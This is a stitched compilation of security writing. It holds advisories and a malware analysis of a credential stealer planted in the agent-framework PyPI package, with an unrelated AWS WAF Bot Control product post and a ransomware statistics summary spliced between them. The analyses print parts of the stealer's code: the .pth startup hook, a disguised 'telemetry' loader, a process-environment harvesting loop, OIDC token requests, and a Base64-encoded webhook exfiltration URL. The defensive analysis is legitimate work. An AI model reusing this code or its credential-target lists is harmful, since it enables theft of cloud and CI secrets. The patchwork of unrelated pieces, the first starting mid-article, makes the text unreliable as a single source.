Both versions shipped a .pth startup hook (a plain-text configuration file processed automatically by Python's site module every time the interpreter starts up), so the credential stealer ran every time Python started on the host. Importing the package was never necessary. It read environment variables from up to 300 running processes, Azure CLI token caches, and pip, npm, Docker, git, and Hugging Face credentials, then called Azure DevOps and GitHub Actions OIDC endpoints and the Azure Instance Metadata Service to mint fresh cloud tokens. Those tokens are how a compromised build can reach the Azure subscription behind it. Everything collected went to a single webhook[.]site endpoint, zlib-compressed and Base64-encoded.

How the agent-framework .pth hook triggers the stealer (1.26.1)

The attacker added two new files (agent_framework_meta.pth, _telemetry.py) and modified one file (__init__.py) in the 1.26.1 compromised package.

The attack is triggered by the .pth hook based on the following single line:

import agent_framework_meta

Every time Python starts, its site module processes any .pth files in the site-packages directory. Any line in these files that begins with import is executed as code, before the user’s script or any other code runs.

This import executes the package’s __init__.py, which contains a loader appended to the end of the file that imports _telemetry.py and calls its _start() function.

# Lightweight runtime diagnostics hook. try: from . import _telemetry as _telemetry _telemetry._start() except Exception: pass

The _start() function uses an environment variable, _AF_TEL, to avoid running more than once per process tree, then forks a child process and detaches it with setsid(). The child collects secrets and POSTs them to webhook[.]site while the parent continues normally, so the theft adds no visible delay. On Windows, where fork() isn’t available, it runs the collection in a background thread instead.

def _start(): if os.environ.get("_AF_TEL"): return os.environ["_AF_TEL"] = "1" try: if hasattr(os, "fork"): pid = os.fork() if pid == 0: try: os.setsid() except Exception: pass _run() os._exit(0) return except Exception: pass try: import threading t = threading.Thread(target=_run) t.daemon = True t.start() except Exception: pass

What the agent-framework credential stealer collects

Environment variables from the host and running processes

The credential stealer collects environment variables whose names contain the following strings:

TOKEN, SECRET, PASSWORD, PASSWD, KEY, CONNECTION, ENDPOINT, AZURE, AWS, GITHUB, GH_, HF_, HUGGING, OPENAI, FOUNDRY, VSS, SYSTEM, BUILD, AGENT, CI_, PIP, NPM, NUGET, COSMOS, STORAGE, SUBSCRIPTION,TENANT, CLIENT, IDENTITY,MSI,MANAGED

The stealer reads up to 300 running processes by reading /proc/<pid>/environ, keeping lines that contain secrets, including SYSTEM_ACCESSTOKEN and IDENTITY_HEADER.

for e in glob.glob("/proc/[0-9]*/environ")[:300]: try: raw = open(e, "rb").read().decode("utf-8", "replace") hits = [] for kv in raw.split("\x00"): if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH","SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")): hits.append(kv[:2000]) if hits: out["env"]["PROC:" + e] = "\n".join(hits)[:12000]

Credential and configuration files on disk

The stealer checks a hardcoded list of glob patterns covering credential locations across all user home directories as well as /root. Targets include:

Azure CLI token caches (~/.azure),

Pip configuration: pip.conf, .npmrc, .netrc, .git-credentials

Docker config.json

Hugging Face tokens

Foundry configuration

.env files under /app and /workspace

Azure Pipelines agent .credentials files

Azure DevOps OIDC tokens from the pipeline endpoint

If the stealer runs inside an Azure DevOps pipeline, it uses SYSTEM_ACCESSTOKEN to call the pipeline OIDC endpoint (SYSTEM_OIDCREQUESTURI), first requesting the api://AzureADTokenExchange scope and then retrying with an empty request body. Neither request includes the serviceConnectionId parameter that Microsoft’s documented flow uses to issue a token for a specific service connection, so it is unclear whether these requests return a token that matches any federated credential.

If a usable token is obtained, whether through this request or from the environment variables exposed by Azure tasks, it could be exchanged for Microsoft Entra ID access as the identity behind the corresponding workflow identity federation service connection.

The attacker would gain that identity’s Azure role assignments, which may be limited to a single resource group or extend to an entire subscription, depending on how the service connection was configured.

Title: Introducing simplified onboarding for AWS WAF Bot Control at the targeted inspection level
Context: Automatic SDK integration – This option is available for protection packs with the CloudFront scope and is turned on by default, so the targeted detections receive browser...
Full Text:
Today, we’re announcing simplified onboarding and bot confidence levels for AWS WAF Bot Control at the targeted inspection level, which we refer to as Targeted bot control in this post, matching the console. Bot confidence levels and the new LATEST rule group version are available for the resource types that AWS WAF protects: you act on advanced bot detections by confidence level instead of writing label rules, and you stay on the newest detections without manual upgrades, helping you respond to automated traffic, including traffic from AI-powered bots. For the websites and applications that you deliver through Amazon CloudFront, simplified onboarding goes further: you turn on Targeted bot control from a single console setting, and automatic SDK integration, which launched last month, removes the need for application code changes in many cases.

In this post, we explain what the simplified onboarding experience looks like and how to get started when protecting CloudFront-delivered applications.

Granular control takes effort to configure

Targeted bot control uses advanced behavioral analysis designed to help identify sophisticated bots that attempt to evade traditional detection mechanisms. It uses machine learning and client-side signals to help detect sophisticated AI-based bots. It’s also deliberately granular: it surfaces each detection as its own label, so you can build rules around specific behaviors. The number of choices (which labels, which combinations, and which order) is a lot to evaluate and implement when your immediate goal is to implement the first round of protections.

To get the full value of Targeted bot control, and to help reduce false positives by grouping its signals into confidence levels, you typically do the following:

Add the AWS WAF Bot Control managed rule group to your protection pack, set the inspection level to Targeted, and choose a rule group version.

Integrate the AWS WAF JavaScript SDK into your application. This is an application code change, often owned by a different team at your company and tied to a different release cycle.

Learn which AWS WAF labels the rules emit and what they mean, and decide which combinations indicate a bot with high confidence.

Write label-match rules that group those labels into bot confidence levels, place them in the right order, and keep them current as new rule group versions add labels.

We’ve published guidance on grouping targeted bot labels into confidence tiers. For teams without dedicated security engineers, the path to implement the solution can be long. Completing every step can take time, especially when the SDK integration depends on another team’s release cycle, so rules can remain in Count mode longer than intended.

What’s new

You can now turn on Targeted bot control with a single toggle. AWS WAF sets up the recommended configuration for you and keeps it on the latest detections, and you don’t need to change your application code to integrate AWS WAF JavaScript SDK for CloudFront-delivered applications in many cases. When you use this toggle, AWS WAF configures the following for you:

Targeted inspection level – The AWS WAF Bot Control rule group is added (or configured) with the inspection level set to Targeted and machine learning turned on.

Actions for each bot confidence level – Each confidence level (High, Medium, or Low) gets an AWS-recommended action, which you can change.

Rule group version – The rule group is set to the LATEST version, which points to the most recent AWS WAF Bot Control release, so you get new detections without upgrading manually.

Rule order – A newly added AWS WAF Bot Control rule group is placed after the existing rules.

Automatic SDK integration – This option is available for protection packs with the CloudFront scope and is turned on by default, so the targeted detections receive browser signals from the start. If you want, you can use this feature stand-alone.

Bot confidence

With bot confidence, AWS WAF Bot Control now adds a High, Medium, or Low bot confidence level to each request that it evaluates at the targeted inspection level. The confidence level reflects how likely it is that the request comes from an automated client that exhibits behaviors that you might not want.

Several AWS WAF Bot Control rules already report their own confidence levels with AWS WAF labels, for example TGT_ML_CoordinatedActivityLow/Medium/High and TGT_TokenReuseIpLow/Medium/High rules, and the TGT_VolumetricSession rule emits labels ending in volumetric:session:low, volumetric:session:medium, and volumetric:session:high. Each of those describes the strength of one detection. Bot confidence combines the targeted detections into one High, Medium, or Low level for each request, so you choose one action per level instead of writing rules across many labels. Bot confidence also emits three labels ending in targeted:signal:bot_signal:low, targeted:signal:bot_signal:medium and targeted:signal:bot_signal:high.

The confidence levels and their default actions reflect AWS recommendations to AWS WAF Bot Control customers.

Confidence level

What it indicates

Default action

High

A signal that by itself strongly indicates automation, or two or more signals that corroborate each other

CAPTCHA

Medium

A signal that indicates automation, but no other signal corroborates it; the request might still come from a person

CAPTCHA

Low

Only weak signals of automation

Challenge

The defaults are chosen to help keep false positives low. High-confidence and Medium-confidence bot traffic receives a CAPTCHA puzzle rather than a block, so a misclassified user can still get through. Low-confidence bot traffic receives a silent Challenge, which is designed to complete in the browser without requiring user interaction. You can change any of these actions to Allow, Block, CAPTCHA, Challenge, Count, or Monetize.

The confidence levels are added alongside the existing AWS WAF Bot Control labels. The existing detection labels that AWS WAF Bot Control emits are still attached to the request, so you can inspect any request and see which signals contributed to its confidence level.

Automatic SDK integration for CloudFront

The AWS WAF JavaScript SDK runs in the viewer’s browser, where it can see signals the server doesn’t normally receive, such as mouse movements, key presses, form interactions, and device characteristics. These client-side signals help improve the accuracy of the targeted detections in distinguishing between a person and an automated client. The SDK silently acquires and refreshes an AWS WAF token as the page loads, without the extra charges or interruptions of Challenge and CAPTCHA rule actions.

That token travels with each request and is used by AWS WAF Bot Control at the targeted inspection level, AWS WAF Fraud Control account takeover prevention, and AWS WAF Fraud Control account creation fraud prevention. Until now, integrating the SDK meant adding a script tag to your pages yourself.

With automatic SDK integration for CloudFront, you don’t add the script tag yourself. When the setting is on, CloudFront inserts the same script tag that a manual integration uses, pointing to your protection pack’s integration URL. AWS WAF evaluation, token acquisition, and token refresh work the same way as they do with a manual integration.

Automatic SDK integration is available for any protection pack with the CloudFront scope that contains one of the following managed rule groups:

AWS WAF Bot Control with targeted inspection level

AWS WAF Fraud Control account takeover prevention

AWS WAF Fraud Control account creation fraud prevention

For the up-to-date list of managed rule groups supporting this feature, see Automatic SDK integration for CloudFront distributions.

A rule group also qualifies when its actions are overridden to Count, so you can add the SDK while you evaluate the rule group. When you create a new protection pack with the CloudFront scope in the console, automatic SDK integration is turned on by default. Protection packs created before the feature launched aren’t changed. You can also turn the setting off with a single toggle if you prefer to integrate the SDK yourself. The SDK collects client-side signals and stores the AWS WAF token in a cookie named aws-waf-token. The token contains information collected from your visitors’ browsers. As described in AWS WAF token characteristics, the information gathered is non-unique and can’t be mapped to an individual human being. Before you turn on automatic SDK integration, review your privacy notice and any cookie consent obligations that apply to your sites, for example under GDPR and the ePrivacy Directive.

Walkthrough

In this section, we show you how to enable Targeted bot control with bot confidence and automatic SDK integration for CloudFront.

Prerequisites

To follow this walkthrough, you need the following:

A CloudFront distribution that serves HTML pages.

The CloudFront distribution uses pay-as-you-go pricing, because distributions on a CloudFront flat-rate pricing plan don’t support AWS WAF Bot Control at the targeted inspection level.

Enable Targeted bot control on a new protection pack

When you create a new protection pack, you can turn on Targeted bot control together with automatic SDK integration.

Open the AWS Management Console for AWS WAF & Shield and choose Protection packs (web ACLs), then Create protection pack (web ACL).

Under App category, select the category that describes your application. Under Add resources, select your CloudFront distribution.

Select one of the predefined protection pack options. The Targeted bot control section isn’t available when you choose Build your own.

In the Targeted bot control section, choose Enable Targeted bot control.

Figure 1: The Targeted bot control section during protection pack creation

Review the action for each confidence level. The defaults are CAPTCHA for High, CAPTCHA for Medium, and Challenge for Low. To observe the effect before you enforce, select Set all actions to Count.

Confirm that Enable automatic SDK integration is selected.

Choose Create protection pack (web ACL).

Enable Targeted bot control on an existing protection pack

These steps work whether your protection pack doesn’t yet have AWS WAF Bot Control, uses AWS WAF Bot Control at the common level, or uses an older AWS WAF Bot Control version.

In the AWS WAF & Shield console, open Protection packs (web ACLs) and select a protection pack with the CloudFront scope.

Figure 2: Choosing an existing protection pack

In the side pane, choose Configure Targeted bot control.

Choose Enable Targeted bot control.

Figure 3: The Configure Targeted bot control page

Review the actions for each confidence level and the automatic SDK integration setting.

Choose Save. If the change upgrades the AWS WAF Bot Control rule group to LATEST, a confirmation dialog shows the current and target versions. Review it and confirm.

Configuring through the API

If you manage AWS WAF as code, you can configure the same pieces directly. For automatic SDK integration, add the ChallengeJavascriptSdkInjection setting to the AssociationConfig of the web ACL in a CreateWebACL or UpdateWebACL request, using the CLOUDFRONT key with an empty configuration object:

"AssociationConfig": { "ChallengeJavascriptSdkInjection": { "CLOUDFRONT": {} } }

Through the API, the setting is off by default. An UpdateWebACL request that omits the setting turns it off, even if you turned it on in the console. For the rule group, set the inspection level to TARGETED with machine learning enabled in the AWSManagedRulesBotControlRuleSet configuration, and use RuleActionOverrides to set the actions for TGT_SignalBotHigh, TGT_SignalBotMedium, and TGT_SignalBotLow.

For the API specifications, see AssociationConfig and ManagedRuleGroupStatement in the AWS WAF API Reference.

Considerations

Considerations when using bot confidence and automatic SDK integration for CloudFront:

Bot confidence

Review the following when you use bot confidence.

Exclude known automation from bot inspection. If you find known clients that are being flagged, add a scope-down statement to the AWS WAF Bot Control rule group that excludes them, for example by path, header, or IP set. This also keeps you from paying to inspect traffic you already trust.

Stay on the LATEST version. Bot confidence requires version 8.0 or later. LATEST keeps you on the newest release automatically; if you pin a static version for change control, choose 8.0 or later and review new versions as they’re released.

For the full list of considerations about bot confidence, see Bot confidence levels in the AWS WAF Developer Guide.

Automatic SDK integration for CloudFront

Review the following before you turn on automatic SDK integration.

Confirm that the SDK reaches the pages that matter. After you turn the setting on, view the source of your key pages, such as the home page, sign-in, checkout, and search, to confirm the script tag is present. If your distribution caches HTML, invalidate the cached HTML paths so viewers get the updated pages right away. Do the same when you turn the setting off.

Update your content security policy. If your pages set a content security policy, allowlist https://*.awswaf.com in the directives shown in Using the JavaScript API with content security policies.

Use Cache-Control: no-transform to keep the tag off specific pages. The setting applies to the whole protection pack, and scope-down statements don’t limit where the tag is inserted.

Keep your existing integration where your application relies on the SDK directly. Single-page applications that attach tokens to their own API calls, and applications that use the CAPTCHA JavaScript API or the mobile SDKs, should continue to integrate the SDK as they do today.

For the full list of considerations and edge cases, see Considerations and limitations and When pages don’t receive the tag in the AWS WAF Developer Guide.

Availability and pricing

Simplified onboarding to Targeted bot control is available for protection packs with the CloudFront scope. Bot confidence levels and the new LATEST rule group version are available for the resource types that AWS WAF protects, in the AWS Regions where AWS WAF Bot Control is available. Automatic SDK integration is available for protection packs with the CloudFront scope. This post focuses on CloudFront because you get both features there.

Standard AWS WAF Bot Control charges for the targeted inspection level apply. Automatic SDK integration for CloudFront is available at no additional cost. For details, see AWS WAF pricing.

Conclusion

Simplified onboarding for Targeted bot control takes care of most of the configuration work. You enable Targeted bot control and choose one action for each of three bot confidence levels, or keep the defaults, and enable automatic SDK integration for CloudFront. Your protection pack starts with the configuration we recommend, stays on the latest detections, and doesn’t require you to integrate the JavaScript SDK manually with your CloudFront-delivered applications.

Full Text:
Executive Summary #

The Microsoft agent-framework PyPI package was compromised on November 17th, affecting versions 1.26.1 and 1.26.2. Both versions install Python startup hooks that silently collect credentials, environment data, and cloud identity tokens, then exfiltrate them to a webhook[.]site endpoint. Avoid installing either version; if installed, remove them and rotate potentially exposed credentials.

Attack Analysis #

On Python startup, the .pth file imports a module that launches collection in a background process/thread. Version 1.26.1 routes through agent_framework_meta.pth → agent_framework_meta/**init**.py → agent_framework_meta/_telemetry.py; 1.26.2 uses af_runtime_diag.pth → af_runtime_diag.py.

The code gathers credential-related environment variables, local config/credential files, and other processes’ environments. It also requests cloud/workflow identity tokens (including Azure in both versions and GitHub Actions OIDC in 1.26.2). It serializes the results, compresses and Base64-encodes them, then POSTs them to the same concealed webhook.site endpoint: https[://]webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb

Version 1.26.1: startup hook → package initializer → collector.

agent_framework_meta.pth executes on interpreter startup through Python’s site processing:

import agent_framework_meta

agent_framework_meta/__init__.py adds a supposedly diagnostic hook that imports and starts the payload, suppressing errors:

# Lightweight runtime diagnostics hook try: from . import _telemetry as _telemetry _telemetry._start() except Exception: pass

agent_framework_meta/_telemetry.py collects credentials asynchronously. Its startup guard is inherited by child processes; on Unix, it forks and detaches. Platforms without fork use a daemon thread.

def _start(): if os.environ.get("_AF_TEL"): return os.environ["_AF_TEL"] = "1" try: if hasattr(os, "fork"): pid = os.fork() if pid == 0: try: os.setsid() except Exception: pass _run() os._exit(0) return

Fresh process trees can trigger collection again; there is no persistent on-disk execution marker.

Version 1.26.2: relocated payload and expanded GitHub targeting.

af_runtime_diag.pth replaces the original startup hook with a single line that imports the new top-level payload:

import af_runtime_diag

af_runtime_diag.py starts collection on import. The legitimate package initializer is restored byte-for-byte, so inspecting only agent_framework_meta/__init__.py misses this version. The collector adds GitHub Actions OIDC token requests:

u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or "" t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or "" if u and t: for aud in ("api://AzureADTokenExchange", "<https://management.azure.com/>"):

Both collectors harvest and exfiltrate secrets.

They inspect environment variables, other processes’ environments, credential files, and cloud identity endpoints. They actively request fresh Azure managed-identity and CI federation tokens rather than merely copying existing secrets.

Both payload modules contain the same encoded destination:

_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi"

Collected JSON is zlib-compressed, base64-encoded, and POSTed to the decoded webhook with ?t=telemetry. Encoding provides no confidentiality beyond HTTPS. The reported payloads do not download or execute additional code.

Targeted Credentials #

Environment secrets: substring-based matching, not a fixed variable allowlist. Reported selectors include TOKEN, SECRET, KEY, AZURE, AWS, GITHUB, OPENAI, HF_, FOUNDRY, TENANT, CLIENT, and MANAGED. Version 1.26.2 adds ACTIONS, OIDC, RUNNER, and ARM_.

Other processes: /proc/*/environ, filtering for TOKEN, SECRET, PASSWORD, KEY=, SYSTEM_ACCESSTOKEN, and IDENTITY_HEADER; 1.26.2 also matches ACTIONS_ID_TOKEN.

SYSTEM_ACCESSTOKEN and SYSTEM_OIDCREQUESTURI for Azure DevOps federation tokens.

1.26.1 also targets /agent/_work/*/.credentials.

Token audiences include Azure management, AI/ML, Cognitive Services, Storage, Key Vault, Search, Microsoft Graph, Container Registry, Azure DevOps, and Azure AD token exchange.

GitHub Actions—expanded in 1.26.2:

ACTIONS_ID_TOKEN_REQUEST_URL, ACTIONS_ID_TOKEN_REQUEST_TOKEN, and fallback ACTIONS_RUNTIME_TOKEN.

OIDC tokens for api://AzureADTokenExchange and https://management.azure.com/.

Added file patterns: /home/runner/work/_temp/*, /home/runner/.azure/*.json, and /home/runner/.azure/*/*.json.

Title: Microsoft agent-framework Compromised: Credential Stealer Targets Azure and CI Pipelines
Context: As of 21:30 UTC, both versions were no longer available on PyPI
Full Text:
At 20:35 UTC on November 17, 2026, a malicious version (1.26.1) of the agent-framework package (Microsoft Agent Framework) was uploaded to PyPI. A second version, 1.26.2, followed at 21:08 UTC. As of 21:30 UTC, both versions were no longer available on PyPI. The package gets about 41,000 downloads a week.

The most recent safe version is 1.26.0.

When a malicious version is installed, it drops a .pth file into the site-packages root (agent_framework_meta.pth in 1.26.1, af_runtime_diag.pth in 1.26.2). Python runs .pth files on every interpreter start, so the credential stealer runs whenever Python starts in that environment, even if agent-framework is never imported.

Root Cause

The root cause hasn't been confirmed. What we know so far:

There is no python-1.26.1 tag or release in microsoft/agent-framework, and the main branch doesn't contain the malicious code.

Legitimate releases publish a wheel and an sdist together with agent-framework-core of the same version. 1.26.1 was a wheel only, and still depends on agent-framework-core[all]==1.26.0.

This indicates 1.26.1 may have been built outside the project's normal release process and uploaded directly to PyPI.

Earlier this year, another Microsoft Python package, durabletask, was compromised after its PyPI token was stolen. We have not linked the two incidents.

Payload

agent_framework_meta.pth contains one line: import agent_framework_meta

In 1.26.1, agent_framework_meta/__init__.py then calls _telemetry._start(). The stealer forks into a detached session (os.setsid()), or falls back to a daemon thread where fork isn't available. It sets _AF_TEL=1 to avoid running again in child processes.

The file and function names (_telemetry, "Lightweight runtime diagnostics hook", user-agent af-runtime-diagnostics/1) are made to look like legitimate SDK telemetry.

Credential Stealer

The stealer is focused on Azure and Azure DevOps. It collects:

Environment variables with names containing strings such as TOKEN, SECRET, PASSWORD, KEY, AZURE, AWS, GITHUB, OPENAI, HF_, FOUNDRY, NPM, PIP, NUGET, SYSTEM, BUILD, AGENT

Other processes' environments: secret-looking values read from up to 300 /proc/*/environ files

Credential files (up to 60):

Azure CLI (~/.azure/)

.npmrc, pip.conf, .netrc, .git-credentials, .docker/config.json

Hugging Face tokens

Azure DevOps agent .credentials

.env and JSON files under /app and /workspace

Azure DevOps OIDC tokens: if SYSTEM_ACCESSTOKEN and SYSTEM_OIDCREQUESTURI are set, it requests an OIDC token for api://AzureADTokenExchange

Azure managed-identity tokens from IMDS or the App Service identity endpoint for 12 resources: ARM, Graph, Key Vault, Storage, Cognitive Services, Azure AI/ML, Search, Container Registry, Azure DevOps, and AzureADTokenExchange

Azure instance metadata

Everything is put into one JSON document, zlib-compressed, base64-encoded, and sent in one HTTPS POST to webhook[.]site. The URL is hardcoded and the payload has no fallback channel. Failures are silently ignored and not retried.

Version 1.26.2

1.26.2 was uploaded at 21:08 UTC, 33 minutes after 1.26.1. It is a repacked 1.26.1 that sends to the same webhook.site URL, with these changes:

New trigger. agent_framework_meta/__init__.py is restored to the clean 1.26.0 file. Instead, a new top-level af_runtime_diag.pth imports a new top-level module, af_runtime_diag.py, which starts the stealer as soon as it is imported. Searching only for the 1.26.1 file names will miss this version.

GitHub Actions OIDC theft. In workflows with id-token: write, it requests OIDC tokens for api://AzureADTokenExchange and https://management.azure.com/. Where an Entra ID federated credential trusts the workflow, these tokens can be exchanged for Azure access, with no stored secret needed.

Wider collection. Environment-variable matching now includes ACTIONS, OIDC, RUNNER and ARM_. GitHub-hosted runner paths (/home/runner/work/_temp/*, /home/runner/.azure/) were added, and the file cap rose from 60 to 80.

New User-Agent: runtime-diagnostics/1

How webhook.site limits the impact

webhook.site is a public request-inspection service. On its free tier, a URL that isn't attached to an account:

accepts at most 100 requests. After that, new requests get HTTP 410 Gone or 429 Too Many Requests and are not logged.

expires after 7 days.

We have confirmed the attackers token was on the free tier, and a maximum of 50 requests were captured. However, those requests can contain working cloud, CI and registry credentials.

Wiz customers should refer to the Wiz Threat Intelligence Center advisory on this incident.

Identify exposure: search lockfiles, CI logs, virtualenvs and container images for agent-framework 1.26.1 or 1.26.2. Pin to 1.26.0.

Check for execution: look in site-packages for agent_framework_meta.pth and agent_framework_meta/_telemetry.py (1.26.1), or af_runtime_diag.pth and af_runtime_diag.py (1.26.2). Any Python process started in that environment ran the payload.

Rotate repository and organization secrets that were exposed to the job.

Title: The State of Ransomware Q3 2026
Context: Ransomware reached record levels in Q3 2026, but the scale of activity is only part of what changed
Full Text:
Ransomware reached record levels in Q3 2026, but the scale of activity is only part of what changed. The ecosystem producing those attacks is becoming increasingly fragmented: more ransomware brands are claiming victims, the top groups account for a smaller share of overall activity, and several major organizations are pushing back against high-value ransom demands. At the same time, established operators such as Qilin and The Gentlemen remain firmly at the top, creating a landscape where strong leaders coexist with an increasingly crowded field of ransomware groups.

Key observed findings

Q3 2026 was the highest-volume quarter on record, with 2,830 victims published on data leak sites. July recorded 964 victims, August reached 1,042, and September recorded 824.

The ransomware ecosystem became more fragmented. The top 10 groups’ share of victims fell for the third consecutive quarter, from 71% in Q1 to 58% in Q2 and 49% in Q3. For the first time, groups outside the top ten collectively accounted for the majority of observed victims.

The number of active ransomware brands continued to grow. 117 distinct brands claimed at least one victim in Q3, up from 91 in Q2. Of these, 51 had not claimed a victim in Q2, and 42 made their first observed victim claims during Q3.

Qilin remained on top with The Gentlemen still close by. Following the ending of Q2, when for the first time in 2026 Qilin briefly relinquished the leading position in favor of The Gentlemen for one month, Qilin reclaimed first place in July and August, before being overtaken yet again by The Gentlemen in September. Eventually Qilin remained in top position for yet another quarter by a narrow gap.

LockBit’s decline continued throughout 2026. Once one of the most prolific ransomware operations, LockBit recorded fewer victims in each successive quarter and fell out of the top ten altogether in Q3.

Several major organizations rejected high-value extortion demands. Stadler Rail, the Berlin state government and Manchester Airports Group were among the high-profile organizations that publicly refused ransom demands during the quarter.

Ransomware payment patterns continued to diverge. Average payments fell 45% quarter over quarter to just over $1 million, while the median increased 167% to $400,000, pointing to different dynamics between routine payments and the largest extortion demands.

The ShinyHunters-Clop dispute exposed rivalry within the ransomware ecosystem. ShinyHunters reportedly breached and defaced Clop’s leak site and demanded a public apology alongside payment, while Q3 also brought increased law-enforcement pressure against cybercriminal operations.

To read the full findings, access the State of Ransomware Q2 2026 report from Check Point Research here.
